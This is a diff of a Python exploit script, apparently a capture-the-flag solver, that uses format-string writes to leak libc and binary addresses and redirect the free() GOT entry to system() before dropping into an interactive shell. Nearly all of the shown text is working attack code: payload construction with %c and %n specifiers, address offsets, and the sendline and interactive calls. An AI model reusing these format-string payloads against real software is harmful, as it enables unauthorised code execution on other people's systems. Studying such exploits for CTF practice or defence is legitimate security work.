@@ -45,11 +45,10 @@ def write_payload(value, written, offset, byte_num):
     for o in range(offset):
         payload += b"%c"#For skipping
 
-    if byte_num == 3:
+    if byte_num == 3: #DEBUG
         payload += "%{bt}c|0x%016lx".format(bt=byte_to_write).encode()
     else:
         payload += "%{bt}c%{fmt}".format(bt=byte_to_write, fmt=byte_fmt).encode()
-    #payload += "%{bt}c%{fmt}".format(bt=byte_to_write, fmt=byte_fmt).encode()
 
     print(f"[*] Payload: {payload}\n")
 
@@ -94,7 +93,6 @@ def main():
     print(f"Libc base: {hex(libc_base)}")
     print(f"System: {hex(system)}")
     print(f"Binary base: {hex(bin_base)}")
-
     r.recvuntil(b"try it: ")
 
     free_got_off = 0x4000
@@ -119,19 +117,14 @@ def main():
         ]
     else:
         writes += [
-            {"val":rbp_addr + 0x3c0, "off":29, "byte_num":2},
+            {"val":rbp_addr + 0x3e0, "off":29, "byte_num":2},
             {"val":(bin_base + free_got_off) & 0xffff, "off":47, "byte_num":2},
-            {"val":(system & 0xffff), "off":130, "byte_num":2},
+            {"val":(system & 0xffff), "off":134, "byte_num":2},
         ]
 
     payload += get_writes(writes, already_written=len(cmd))
 
-    #payload = b"%c%c%c%c%c%c%c%n"
     r.sendline(payload)
-    #print(payload)
-    #payload = b"AAAAAAAA%8$hhn"
-    #r.sendline(payload)
-    #binary_base = X - 0x1248
 
     r.interactive()
 
